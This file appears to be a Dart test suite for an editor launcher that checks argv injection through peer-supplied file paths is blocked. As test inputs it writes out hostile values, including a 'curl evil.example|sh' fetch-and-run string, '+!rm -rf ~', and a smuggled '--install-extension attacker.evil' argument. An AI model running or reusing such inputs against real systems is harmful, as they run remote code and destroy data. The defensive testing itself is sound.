// Copyright 2026 Ferrite Engineering LLC
// SPDX-License-Identifier: Apache-2.0

import 'dart:io';

import 'package:crux_io/crux_io.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:simcrux/features/inspector/services/editor_launcher.dart';

class _RecordingStarter {
  final List<({String executable, List<String> args})> calls =
      <({String executable, List<String> args})>[];
  bool throwOnStart = false;

  Future<Process> start(String executable, List<String> args) async {
    calls.add((executable: executable, args: List.unmodifiable(args)));
    if (throwOnStart) {
      throw ProcessException(executable, args, 'fake fail', -1);
    }
    return _FakeProcess();
  }
}

class _FakeProcess implements Process {
  @override
  int get pid => 1;

  @override
  Future<int> get exitCode async => 0;

  @override
  bool kill([ProcessSignal signal = ProcessSignal.sigterm]) => true;

  @override
  Stream<List<int>> get stderr => const Stream.empty();

  @override
  IOSink get stdin => throw UnimplementedError();

  @override
  Stream<List<int>> get stdout => const Stream.empty();
}

void main() {
  group('EditorLauncher.composeCommand', () {
    test('substitutes {file}, {line}, {column} and splits arguments', () {
      final launcher = EditorLauncher(
        template: 'code --goto {file}:{line}:{column}',
      );
      final cmd = launcher.composeCommand(
        filePath: '/tmp/foo.sv',
        line: 12,
        column: 3,
      );
      expect(cmd, isNotNull);
      expect(cmd!.executable, 'code');
      expect(cmd.args, <String>['--goto', '/tmp/foo.sv:12:3']);
    });

    test('returns null for empty template', () {
      final launcher = EditorLauncher(template: '   ');
      expect(launcher.composeCommand(filePath: 'x'), isNull);
    });

    test('supports preset commands for sublime/vim/emacs', () {
      expect(
        EditorLauncher(
          template: 'subl {file}:{line}',
        ).composeCommand(filePath: 'a.sv', line: 7)!.args,
        <String>['a.sv:7'],
      );
      expect(
        EditorLauncher(
          template: 'vim +{line} {file}',
        ).composeCommand(filePath: 'a.sv', line: 7)!.args,
        <String>['+7', 'a.sv'],
      );
      expect(
        EditorLauncher(
          template: 'emacsclient -n +{line}:{column} {file}',
        ).composeCommand(filePath: 'a.sv', line: 7, column: 4)!.args,
        <String>['-n', '+7:4', 'a.sv'],
      );
    });
  });

  group('EditorLauncher argv injection (CXP-reachable)', () {
    // `request_open_source` / `request_open_artifact` carry a peer-supplied
    // `filePath` and the inbound handler performs no sender check, so the
    // substituted value is attacker-controlled on the default
    // `cxpServerEnabled = true` build. Substituting into the template and
    // *then* splitting on whitespace would let that value manufacture new
    // argv elements; the launcher tokenizes the (user-owned) template first
    // and substitutes into each token, so a hostile path stays one argument.
    test('a whitespace-laden path cannot manufacture argv elements', () {
      final launcher = EditorLauncher(
        template: 'code --goto {file}:{line}:{column}',
      );
      final cmd = launcher.composeCommand(
        filePath: 'a --install-extension attacker.evil --goto b',
      );
      expect(cmd, isNotNull);
      expect(cmd!.executable, 'code');
      expect(cmd.args, <String>[
        '--goto',
        'a --install-extension attacker.evil --goto b:1:1',
      ]);
      expect(cmd.args, isNot(contains('--install-extension')));
    });

    test('a hostile path cannot replace the executable', () {
      final launcher = EditorLauncher(template: '{file} --goto {line}');
      final cmd = launcher.composeCommand(
        filePath: '/bin/sh -c curl evil.example|sh',
        line: 3,
      );
      expect(cmd, isNotNull);
      expect(cmd!.executable, '/bin/sh -c curl evil.example|sh');
      expect(cmd.args, <String>['--goto', '3']);
    });

    test('newlines and tabs in a path stay inside one argument', () {
      final launcher = EditorLauncher(template: 'code {file}');
      final cmd = launcher.composeCommand(
        filePath: 'a\n--install-extension\tb',
      );
      expect(cmd, isNotNull);
      expect(cmd!.executable, 'code');
      expect(cmd.args, <String>['a\n--install-extension\tb']);
    });

    test(
      'openSource passes the hostile path through as one argv element',
      () async {
        final recorder = _RecordingStarter();
        final launcher = EditorLauncher(
          template: 'code --goto {file}:{line}:{column}',
          processStarter: recorder.start,
          spawnHost: _posix,
        );
        // Absolute, so it passes the path check and reaches the argv: the
        // whitespace is what this test is about.
        await launcher.openSource(
          filePath: '/w/a --install-extension attacker.evil --goto b',
          line: 7,
          column: 2,
        );
        expect(recorder.calls.single.args, hasLength(2));
        expect(recorder.calls.single.args.first, '--goto');
      },
    );
  });

  group('EditorLauncher.openSource', () {
    test(
      'invokes the injected process starter with the composed command',
      () async {
        final recorder = _RecordingStarter();
        final launcher = EditorLauncher(
          template: 'code --goto {file}:{line}:{column}',
          processStarter: recorder.start,
          spawnHost: _posix,
        );
        final ok = await launcher.openSource(
          filePath: '/w/x.sv',
          line: 2,
          column: 5,
        );
        expect(ok, isTrue);
        expect(recorder.calls, hasLength(1));
        expect(recorder.calls.single.executable, 'code');
        expect(recorder.calls.single.args, <String>['--goto', '/w/x.sv:2:5']);
      },
    );

    test('returns false on a malformed template', () async {
      final launcher = EditorLauncher(template: '', spawnHost: _posix);
      expect(await launcher.openSource(filePath: '/w/x'), isFalse);
    });

    test('returns false on a launcher failure', () async {
      final recorder = _RecordingStarter()..throwOnStart = true;
      final launcher = EditorLauncher(
        template: 'code {file}',
        processStarter: recorder.start,
        spawnHost: _posix,
      );
      expect(await launcher.openSource(filePath: '/w/x.sv'), isFalse);
    });
  });

  group('EditorLauncher.openSource path check', () {
    // To `vim` and `emacs` an argument beginning with `+` is a command, and
    // the presets put the line number in one. An absolute path is the only
    // shape no editor reads as an option, so nothing else reaches the argv.
    for (final path in const [
      'x.sv',
      '+!rm -rf ~',
      '-c:!id',
      '',
      '/w/a\u0000b.sv',
    ]) {
      test('refuses ${path.isEmpty ? 'an empty path' : '"$path"'} with nothing '
          'spawned', () async {
        final recorder = _RecordingStarter();
        final launcher = EditorLauncher(
          template: 'vim +{line} {file}',
          processStarter: recorder.start,
          spawnHost: _posix,
        );
        expect(await launcher.openSource(filePath: path), isFalse);
        expect(recorder.calls, isEmpty);
      });
    }

    test('accepts a Windows-absolute path on any host', () async {
      // A Windows peer cross-probing into a macOS session sends one.
      final recorder = _RecordingStarter();
      final launcher = EditorLauncher(
        template: 'code {file}',
        processStarter: recorder.start,
        spawnHost: _posix,
      );
      expect(await launcher.openSource(filePath: r'C:\rtl\cpu.v'), isTrue);
      expect(recorder.calls.single.args, <String>[r'C:\rtl\cpu.v']);
    });
  });

  group('EditorLauncher executable resolution (Windows)', () {
    // On Windows a bare `code` is searched for in the launch directory
    // before PATH. The launcher resolves it through crux_io's SpawnHost, so
    // this runs the Windows branch on any machine.
    SpawnHost windowsHost(Set<String> files) => SpawnHost(
      windows: true,
      environment: const <String, String>{
        'PATH': r'C:\Tools;C:\Editors\VS Code\bin',
        'PATHEXT': '.EXE;.CMD',
      },
      exists: files.contains,
    );

    test('a bare editor name is started by its absolute path', () async {
      final recorder = _RecordingStarter();
      final launcher = EditorLauncher(
        template: 'code --goto {file}:{line}',
        processStarter: recorder.start,
        spawnHost: windowsHost({r'C:\Editors\VS Code\bin\code.CMD'}),
      );
      expect(await launcher.openSource(filePath: r'C:\rtl\cpu.v'), isTrue);
      expect(
        recorder.calls.single.executable,
        r'C:\Editors\VS Code\bin\code.CMD',
      );
    });

    test('an editor that is not on PATH starts nothing', () async {
      final recorder = _RecordingStarter();
      final launcher = EditorLauncher(
        template: 'code {file}',
        processStarter: recorder.start,
        spawnHost: windowsHost(const <String>{}),
      );
      expect(await launcher.openSource(filePath: r'C:\rtl\cpu.v'), isFalse);
      expect(
        recorder.calls,
        isEmpty,
        reason: 'the bare name must never reach CreateProcess',
      );
    });

    test('an executable given as a path is started as written', () async {
      final recorder = _RecordingStarter();
      final launcher = EditorLauncher(
        template: r'C:\Editors\subl.exe {file}',
        processStarter: recorder.start,
        spawnHost: windowsHost(const <String>{}),
      );
      expect(await launcher.openSource(filePath: r'C:\rtl\cpu.v'), isTrue);
      expect(recorder.calls.single.executable, r'C:\Editors\subl.exe');
    });
  });
}

/// A POSIX host, so the tests above mean the same thing on every runner:
/// resolution is the identity off Windows.
const SpawnHost _posix = SpawnHost(windows: false);
